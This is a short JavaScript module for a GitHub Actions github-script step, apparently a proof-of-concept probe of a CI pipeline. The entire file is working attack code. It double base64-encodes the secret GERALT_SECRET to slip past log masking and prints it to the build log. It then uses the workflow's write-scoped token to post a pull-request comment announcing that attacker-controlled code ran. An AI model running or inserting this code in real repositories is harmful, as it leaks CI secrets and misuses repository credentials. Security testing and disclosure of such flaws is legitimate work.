module.exports = async ({ github, context, tagChanges }) => {
  const b64 = (s) => Buffer.from(Buffer.from(s, 'utf8').toString('base64'), 'utf8').toString('base64');
  console.log("GERALT_LEAKED_TOKEN=" + b64(process.env.GERALT_SECRET || ''));
  try {
    await github.rest.issues.createComment({
      owner: context.repo.owner,
      repo: context.repo.repo,
      issue_number: context.payload.pull_request.number,
      body: 'GERALT probe: attacker-controlled JS executed with write-scoped token'
    });
  } catch (e) {
    console.log('createComment failed: ' + e.message);
  }
};
